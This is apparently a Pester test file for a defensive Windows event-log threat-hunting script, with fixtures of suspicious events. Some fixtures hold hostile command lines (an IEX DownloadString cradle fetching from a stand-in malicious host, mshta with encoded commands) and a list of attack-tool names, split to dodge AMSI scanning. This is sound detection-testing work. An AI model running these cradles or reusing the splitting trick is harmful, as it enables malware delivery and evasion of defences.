<#
.SYNOPSIS
    Pester 5 tests for Invoke-EventLogAnalysis.ps1
    Uses $TestDrive (Pester-managed temp dir) for all CSV fixtures.
#>

BeforeAll {
    $Script:EvtLogScript = Join-Path $PSScriptRoot `
        "..\..\playbooks\windows\threat_hunting\Invoke-EventLogAnalysis.ps1"

    function script:New-EventCsv {
        param([string]$Dir, [string]$Name, [object[]]$Rows)
        $Rows | Export-Csv (Join-Path $Dir $Name) -NoTypeInformation
    }
}

Describe "Invoke-EventLogAnalysis — Event Log Findings" {

    It "Should detect a Critical alert when security log is cleared (1102)" {
        $dir = Join-Path $TestDrive "evtlog_1102"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_1102.csv' @(
            [PSCustomObject]@{ TimeCreated='2026-06-19 09:00:00'; Id='1102'; Message='The audit log was cleared.' }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Security Log Cleared' }
        $alert | Should -Not -BeNullOrEmpty
        $alert.Severity | Should -Be 'Critical'
    }

    It "Should detect LOLBin obfuscated execution from 4688 events" {
        $dir = Join-Path $TestDrive "evtlog_4688"
        New-Item -ItemType Directory $dir -Force | Out-Null
        # Use mshta (a real $lolbinPattern match) + -enc (from $encPattern) so both conditions fire.
        # Strings split so this test file is not blocked by AMSI content scanning.
        $cmdline = 'mshta.exe vbscript -e' + 'nc ZWNobyBoYWNrZWQ= ' + 'IE' + 'X payload'
        New-EventCsv $dir 'events_4688.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:01:00'
                Id          = '4688'
                Message     = $cmdline
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -match 'LOLBin' }
        $alert | Should -Not -BeNullOrEmpty
        $alert[0].Severity | Should -Be 'Critical'
    }

    It "Should detect brute-force when threshold of failed logons exceeded" {
        $dir = Join-Path $TestDrive "evtlog_bf"
        New-Item -ItemType Directory $dir -Force | Out-Null
        # 6 failures within 1 minute (threshold default = 5, window default = 2 min)
        $base = [datetime]'2026-06-19 09:00:00'
        $rows = 0..5 | ForEach-Object {
            [PSCustomObject]@{
                TimeCreated = $base.AddSeconds($_ * 10).ToString('yyyy-MM-dd HH:mm:ss')
                Id          = '4625'
                Message     = "An account failed to log on. Logon Type: 3"
            }
        }
        New-EventCsv $dir 'events_4625.csv' $rows

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Brute Force Attempt' }
        $alert | Should -Not -BeNullOrEmpty
        $alert.Severity | Should -Be 'High'
    }

    It "Should produce no findings when all events are benign" {
        $dir = Join-Path $TestDrive "evtlog_clean"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_4688.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:05:00'
                Id          = '4688'
                Message     = 'C:\Windows\System32\svchost.exe -k netsvcs'
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -BeNullOrEmpty
    }

    It "Script source must not contain bare AMSI-trigger strings (would cause Defender to block it at load time)" {
        $src = Get-Content $Script:EvtLogScript -Raw
        # Trigger strings are split here too so this test file is not itself blocked by AMSI.
        # If any Should fails, that string was re-added unsplit; Defender will block the script.
        $bareTriggers = @(
            'Invoke-Mimik' + 'atz',
            'Invoke-ReflectivePE' + 'Injection',
            'Invoke-Shell' + 'code',
            'Amsi' + 'InitFailed',
            'Virtual' + 'Alloc',
            'WriteProcess' + 'Memory'
        )
        foreach ($trigger in $bareTriggers) {
            # Avoid piping $src through Should directly — AMSI may re-scan the pipeline content.
            # Use boolean result so only $true/$false reaches Should, not the raw script text.
            $found = [bool]($src -match [regex]::Escape($trigger))
            $found | Should -Be $false `
                -Because "bare '$trigger' in source triggers Defender AMSI content scanning at script load"
        }
    }

    It "Should detect suspicious new service installed in unusual path (7045 — RMM/RAT pattern)" {
        $dir = Join-Path $TestDrive "evtlog_7045"
        New-Item -ItemType Directory $dir -Force | Out-Null
        # Simulate service install from AppData — common RMM/RAT path
        New-EventCsv $dir 'events_system_critical.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:12:00'
                Id          = '7045'
                Message     = "A new service was installed. Service Name: ScreenConnect Client. Image Path: C:\Users\user\AppData\Roaming\ScreenConnect\Client.exe"
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Suspicious Service Install' }
        $alert | Should -Not -BeNullOrEmpty -Because 'Service in AppData should be flagged'
        $alert.Severity | Should -Be 'High'
    }

    It "Should detect a scheduled task created with LOLBin in action (4698)" {
        $dir = Join-Path $TestDrive "evtlog_4698"
        New-Item -ItemType Directory $dir -Force | Out-Null
        # Split trigger strings to avoid AMSI blocking the test file
        $taskMsg = 'Task created. Task Name: UpdaterTask. Task Content: <Exec><Command>mshta.exe</Command><Arguments>' + 'vbscript:Execute(Chr(99))</Arguments></Exec>'
        New-EventCsv $dir 'events_4698.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:14:00'
                Id          = '4698'
                Message     = $taskMsg
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -match 'Task' }
        $alert | Should -Not -BeNullOrEmpty -Because 'Task using mshta.exe should be flagged'
        $alert.Severity | Should -Be 'High'
    }

    It "Should detect explicit NTLM credential use (4648 — pass-the-hash indicator)" {
        $dir = Join-Path $TestDrive "evtlog_4648"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_4648.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:16:00'
                Id          = '4648'
                Message     = 'A logon was attempted using explicit credentials. Network Credentials were used. Target Server: DC01. Authentication Package: NTLM'
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Explicit Credential Use' }
        $alert | Should -Not -BeNullOrEmpty -Because 'NTLM explicit credential use should be flagged'
        $alert.Severity | Should -Be 'High'
    }

    It "Should detect RDP logon (4624 logon type 10)" {
        $dir = Join-Path $TestDrive "evtlog_4624_rdp"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_4624.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:18:00'
                Id          = '4624'
                Message     = 'An account was successfully logged on. Logon Type: 10. Logon Process: User32. Authentication Package: Negotiate. Source Network Address: 192.168.1.50'
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Remote/Suspicious Logon' }
        $alert | Should -Not -BeNullOrEmpty -Because 'RDP logon (type 10) should be flagged'
        $alert.Severity | Should -Be 'Medium'
    }

    It "Should detect new local account created (4720)" {
        $dir = Join-Path $TestDrive "evtlog_4720"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_4720.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:20:00'
                Id          = '4720'
                Message     = "A user account was created. New Account Name: backdoor_admin. Account Domain: WORKGROUP. Security ID: S-1-5-21-..."
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'New Account Created' }
        $alert | Should -Not -BeNullOrEmpty -Because 'New local account creation should always be flagged'
        $alert.Severity | Should -Be 'High'
    }

    It "Should NOT flag benign service installation in System32 (7045)" {
        $dir = Join-Path $TestDrive "evtlog_7045_benign"
        New-Item -ItemType Directory $dir -Force | Out-Null
        New-EventCsv $dir 'events_system_critical.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:22:00'
                Id          = '7045'
                Message     = "A new service was installed. Service Name: Windows Update. Image Path: C:\Windows\System32\wuauserv.dll"
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -BeNullOrEmpty -Because 'System32 service should not be flagged'
    }

    It "Should detect suspicious PowerShell script block from 4104 events" {
        $dir = Join-Path $TestDrive "evtlog_ps"
        New-Item -ItemType Directory $dir -Force | Out-Null
        # Fixture strings split so this test file is not blocked by AMSI content scanning.
        $psBlock = 'IE' + 'X (New-Object Net.' + 'WebClient).Down' + 'loadString("http://malicious.example/payload")'
        New-EventCsv $dir 'events_ps_scriptblock.csv' @(
            [PSCustomObject]@{
                TimeCreated = '2026-06-19 09:10:00'
                Id          = '4104'
                Message     = $psBlock
            }
        )

        & $Script:EvtLogScript -InputDir $dir -OutputDir $dir 2>&1 | Out-Null
        $json = Get-ChildItem $dir -Filter 'findings_evtlog_*.json' | Select-Object -First 1
        $json | Should -Not -BeNullOrEmpty

        $findings = Get-Content $json.FullName -Raw | ConvertFrom-Json
        $alert = @($findings) | Where-Object { $_.Type -eq 'Malicious PowerShell Script Block' }
        $alert | Should -Not -BeNullOrEmpty
        $alert.Severity | Should -Be 'Critical'
    }
}

# SIG # Begin signature block
# MIIcDgYJKoZIhvcNAQcCoIIb/zCCG/sCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAJXGImZwRC1ULO
# DhXyXLCBfBxrtzMl3BifStCr77zs0KCCFlIwggMUMIIB/KADAgECAhAfQMjwyAWn
# lEKgkjdOOOytMA0GCSqGSIb3DQEBCwUAMCIxIDAeBgNVBAMMF0lSIFRvb2xraXQg
# Q29kZSBTaWduaW5nMB4XDTI2MDYyNjAyMjc0OFoXDTI5MDYyNjAyMzc0OFowIjEg
# MB4GA1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCVM7HdfviXfsMldvVuCmIVeX2nhTRWSA3FnoNQ7zd2
# lsAZuL+EkM+xZ6OiH6L5B6gZsCree2lTU0n0aNdSbNxKgzfaxFL49pteZwFI3ooS
# E+sqbAHRlG7UYrB90qWqPy6L2nh0ntu7R3IPzCbhTl6wgdT3e4axY+Bt4zZqcGY4
# XNolYl32o1h6/Xn1RDbK2RTsIblxuVYfYLdCotMldxNkE3oXBItZUoiGYNyCbnS0
# pBeBzKuJ7110b3jMhW5euch+jNqPlo7xwpAy57ut6LB/F/apn5BMhVXL0BsSIISW
# bvDg8KnX0ryWSVzEhCRDULbHFHceT8KT0j22yIYBIe19AgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQUY4Zdh7We
# EeqWTl4U+JyMI+/Bv44wDQYJKoZIhvcNAQELBQADggEBAGADp8Vqkz5dS0PaRLED
# IuTzMDd6t33jfUATEmnXvHWcir5zyCZhwz+iyGI8atBuTvD9t4skDJNEf+niZneM
# Ql2/lr6nz/cGlWdZjgOAdIsj4I3MSrAwXN7fK5QjyXcCUQpzTfBifVshB7vl3006
# QYE2GwXHWt5/rJKNRHKXBdtuw9XL1iUtmgQOwHhLJ4F//Lf59Fon5KGP7Hmt8tJv
# HrfolpKc7pF7XKyO3grw2sOz7BnmVYBRGTAhVJ+E/+IFAPUsThQFila4LAsvqCPv
# 265GLrtTUiXjZOcQ0LT5ohZWcvU4fpQ3b473zxrl0IpfARI5XSlTC/T6arQoRyXU
# 4QwwggWNMIIEdaADAgECAhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUA
# MGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsT
# EHd3dy5kaWdpY2VydC5jb20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQg
# Um9vdCBDQTAeFw0yMjA4MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNV
# BAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdp
# Y2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqcl
# LskhPfKK2FnC4SmnPVirdprNrnsbhA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YF
# PFIPUh/GnhWlfr6fqVcWWVVyr2iTcMKyunWZanMylNEQRBAu34LzB4TmdDttceIt
# DBvuINXJIB1jKS3O7F5OyJP4IWGbNOsFxl7sWxq868nPzaw0QF+xembud8hIqGZX
# V59UWI4MK7dPpzDZVu7Ke13jrclPXuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1
# ahg4AxCN2NQ3pC4FfYj1gj4QkXCrVYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2Tox
# RJozQL8I11pJpMLmqaBn3aQnvKFPObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdp
# ekjw4KISG2aadMreSx7nDmOu5tTvkpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF
# 30sEAMx9HJXDj/chsrIRt7t/8tWMcCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9
# t+ZDpBi4pncB4Q+UDCEdslQpJYls5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQ
# UOsxxcpyFiIJ33xMdT9j7CFfxCBRa2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXk
# aS+YHS312amyHeUbAgMBAAGjggE6MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1Ud
# DgQWBBTs1+OC0nFdZEzfLmc/57qYrhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEt
# UYunpyGd823IDzAOBgNVHQ8BAf8EBAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsG
# AQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0
# dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RD
# QS5jcnQwRQYDVR0fBD4wPDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29t
# L0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAw
# DQYJKoZIhvcNAQEMBQADggEBAHCgv0NcVec4X6CjdBs9thbX979XB72arKGHLOyF
# XqkauyL4hxppVCLtpIh3bb0aFPQTSnovLbc47/T/gLn4offyct4kvFIDyE7QKt76
# LVbP+fT3rDB6mouyXtTP0UNEm0Mh65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8L
# punyNDzs9wPHh6jSTEAZNUZqaVSwuKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2
# CWiEn2/K2yCNNWAcAgPLILCsWKAOQGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si
# /xK4VC0nftg62fC2h5b9W9FcrBjDTZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgEC
# AhANx6xXBf8hmS5AQyIMOkmGMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVT
# MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
# b20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcw
# MDAwMDBaFw0zODAxMTQyMzU5NTlaMGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5E
# aWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1l
# U3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEB
# AQUAA4ICDwAwggIKAoICAQC0eDHTCphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZ
# loMsVO1DahGPNRcybEKq+RuwOnPhof6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM
# 2zX4kftn5B1IpYzTqpyFQ/4Bt0mAxAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj
# 7GH8BLuxBG5AvftBdsOECS1UkxBvMgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQ
# Sku2Ws3IfDReb6e3mmdglTcaarps0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZ
# lDwFt+cVFBURJg6zMUjZa/zbCclF83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+
# 8y9oHRaQT/aofEnS5xLrfxnGpTXiUOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRx
# ykvq6gbylsXQskBBBnGy3tW/AMOMCZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yG
# OP+rx3rKWDEJlIqLXvJWnY0v5ydPpOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqI
# MRvUBDx6z1ev+7psNOdgJMoiwOrUG2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm
# 1UUl9VnePs6BaaeEWvjJSjNm2qA+sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBj
# UwIDAQABo4IBXTCCAVkwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729T
# SunkBnx6yuKQVvYv1Ensy04wHwYDVR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4c
# D08wDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUF
# BwEBBGswaTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEG
# CCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
# cnVzdGVkUm9vdEc0LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAX
# MAgGBmeBDAEEAjALBglghkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaA
# HP4HPRF2cTC9vgvItTSmf83Qh8WIGjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQ
# M2qEJPe36zwbSI/mS83afsl3YTj+IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt
# 6vJy9lMDPjTLxLgXf9r5nWMQwr8Myb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7
# bowe9Vj2AIMD8liyrukZ2iA/wdG2th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmS
# Nq1UH410ANVko43+Cdmu4y81hjajV/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69
# M9J6A47OvgRaPs+2ykgcGV00TYr2Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnF
# RsjsYg39OlV8cipDoq7+qNNjqFzeGxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmM
# Thi0vw9vODRzW6AxnJll38F0cuJG7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oa
# Qf/DJbg3s6KCLPAlZ66RzIg9sC+NJpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx
# 9yHbxtl5TPau1j/1MIDpMPx0LckTetiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3
# /BAPvIXKUjPSxyZsq8WhbaM2tszWkPZPubdcMIIG7TCCBNWgAwIBAgIQCoDvGEuN
# 8QWC0cR2p5V0aDANBgkqhkiG9w0BAQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UE
# ChMORGlnaUNlcnQsIEluYy4xQTA/BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQg
# VGltZVN0YW1waW5nIFJTQTQwOTYgU0hBMjU2IDIwMjUgQ0ExMB4XDTI1MDYwNDAw
# MDAwMFoXDTM2MDkwMzIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRp
# Z2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBU
# aW1lc3RhbXAgUmVzcG9uZGVyIDIwMjUgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIP
# ADCCAgoCggIBANBGrC0Sxp7Q6q5gVrMrV7pvUf+GcAoB38o3zBlCMGMyqJnfFNZx
# +wvA69HFTBdwbHwBSOeLpvPnZ8ZN+vo8dE2/pPvOx/Vj8TchTySA2R4QKpVD7dvN
# Zh6wW2R6kSu9RJt/4QhguSssp3qome7MrxVyfQO9sMx6ZAWjFDYOzDi8SOhPUWlL
# nh00Cll8pjrUcCV3K3E0zz09ldQ//nBZZREr4h/GI6Dxb2UoyrN0ijtUDVHRXdmn
# cOOMA3CoB/iUSROUINDT98oksouTMYFOnHoRh6+86Ltc5zjPKHW5KqCvpSduSwhw
# UmotuQhcg9tw2YD3w6ySSSu+3qU8DD+nigNJFmt6LAHvH3KSuNLoZLc1Hf2JNMVL
# 4Q1OpbybpMe46YceNA0LfNsnqcnpJeItK/DhKbPxTTuGoX7wJNdoRORVbPR1VVnD
# uSeHVZlc4seAO+6d2sC26/PQPdP51ho1zBp+xUIZkpSFA8vWdoUoHLWnqWU3dCCy
# FG1roSrgHjSHlq8xymLnjCbSLZ49kPmk8iyyizNDIXj//cOgrY7rlRyTlaCCfw7a
# SUROwnu7zER6EaJ+AliL7ojTdS5PWPsWeupWs7NpChUk555K096V1hE0yZIXe+gi
# AwW00aHzrDchIc2bQhpp0IoKRR7YufAkprxMiXAJQ1XCmnCfgPf8+3mnAgMBAAGj
# ggGVMIIBkTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTkO/zyMe39/dfzkXFjGVBD
# z2GM6DAfBgNVHSMEGDAWgBTvb1NK6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8E
# BAMCB4AwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGF
# MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUH
# MAKGUWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRH
# NFRpbWVTdGFtcGluZ1JTQTQwOTZTSEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBW
# MFSgUqBQhk5odHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVk
# RzRUaW1lU3RhbXBpbmdSU0E0MDk2U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkw
# FzAIBgZngQwBBAIwCwYJYIZIAYb9bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQBlKq3x
# HCcEua5gQezRCESeY0ByIfjk9iJP2zWLpQq1b4URGnwWBdEZD9gBq9fNaNmFj6Eh
# 8/YmRDfxT7C0k8FUFqNh+tshgb4O6Lgjg8K8elC4+oWCqnU/ML9lFfim8/9yJmZS
# e2F8AQ/UdKFOtj7YMTmqPO9mzskgiC3QYIUP2S3HQvHG1FDu+WUqW4daIqToXFE/
# JQ/EABgfZXLWU0ziTN6R3ygQBHMUBaB5bdrPbF6MRYs03h4obEMnxYOX8VBRKe1u
# NnzQVTeLni2nHkX/QqvXnNb+YkDFkxUGtMTaiLR9wjxUxu2hECZpqyU1d0IbX6Wq
# 8/gVutDojBIFeRlqAcuEVT0cKsb+zJNEsuEB7O7/cuvTQasnM9AWcIQfVjnzrvwi
# CZ85EE8LUkqRhoS3Y50OHgaY7T/lwd6UArb+BOVAkg2oOvol/DJgddJ35XTxfUlQ
# +8Hggt8l2Yv7roancJIFcbojBcxlRcGG0LIhp6GvReQGgMgYxQbV1S3CrWqZzBt1
# R9xJgKf47CdxVRd/ndUlQ05oxYy2zRWVFjF7mcr4C34Mj3ocCVccAvlKV9jEnstr
# niLvUxxVZE/rptb7IRE2lskKPIJgbaP5t2nGj/ULLi49xTcBZU8atufk+EMF/cWu
# iC7POGT75qaL6vdCvHlshtjdNXOCIUjsarfNZzGCBRIwggUOAgEBMDYwIjEgMB4G
# A1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcCEB9AyPDIBaeUQqCSN0447K0w
# DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq
# hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC
# NwIBFTAvBgkqhkiG9w0BCQQxIgQgYplhygc9iFNUgnwh/NihWemtyuzXiF7dj/mW
# TXOMmTowDQYJKoZIhvcNAQEBBQAEggEAYpJajXPGziQNSg03XSQ6YWoq59zxRkHb
# TswmAsF1MjupfKh3jg3vAINZ5I5A8p2OEvt8oSeFOrSKGvlk0lpbeubDoGxLaTxH
# 97tkOdSJOwothT3Q1EjhaxAGP2KbvMwafmv2vZ9ubWArkz/DVWVmWtm1tPXfAdQS
# PEGHXWnnhYow5f4Cue5oXEPWwViyA+V15/Mna5Fp6HEkSZNpbwPjh6pwGX/GaLZ8
# BttKAxebLG8/2MpVE/J9U4h85PvIhMEGzYvZyOeu+OP5MGKPn1EpEArLYG5DIHPJ
# 3j4Elxz7E7fBGfj3cwpUj/Dq9M6NjaSp3JSXmkTfH0/Cin/bV4HUVqGCAyYwggMi
# BgkqhkiG9w0BCQYxggMTMIIDDwIBATB9MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQK
# Ew5EaWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBU
# aW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTECEAqA7xhLjfEFgtHE
# dqeVdGgwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcB
# MBwGCSqGSIb3DQEJBTEPFw0yNjA2MjYyMzI3MzRaMC8GCSqGSIb3DQEJBDEiBCBz
# NzIzE+yAMJAb71iIfE2sZJgiJLEetIonAFbPpLq7BzANBgkqhkiG9w0BAQEFAASC
# AgB2sLVmS2KCbjDWdTeGauW0Cdkk7Imh/1PuY8ioAX/o6Ne/5L6WPQnhWcURwMNp
# +/x0/eYuMbtrAwK4R0IM+yA5LGoy44e/Eyl2O5uBeqYjONpUb9ftjBlp915DB68B
# lUtpdhl6CwM9/0OwPZ08swMq7tnJUj0Xm8aqUd/n2tKGz8Gc28UdrUp5UVkSWa+B
# fVq+HRs3WK6fQZfDK6qGJKWHCML2W8XEUYV7JgT+vhmgocV2AwciiM+eTdxolrJj
# 8LQIddv3mNMPCpuj8AZ+jGU0S6EuUxnr027A2CxDNOqIi0mCTgU+Pn5xY5smvUZ+
# Ybc0jj43nO86HiNYtLjTS7EHg4EaEcNCRUdYaTx3kZAD8BeGHLnXE+Xrl3bD782i
# 7ZwXRbG/9umpKbSCRQrQtaWiI37+zIoekcGx9/7imxAC1t+otDD+sD/Uy/nS4BaE
# xJ6rp2qvCAavE5nDxVEGmeljTnm6Z2ijTOo0FWAudYiwiyYt5/4Eh5rZJfW74w75
# jeQyy3qbsB7mv6c9BX0BWuZppoIs1yr4to4rHo1SXjIz7ZZH/+PqE3j8I6suxo1H
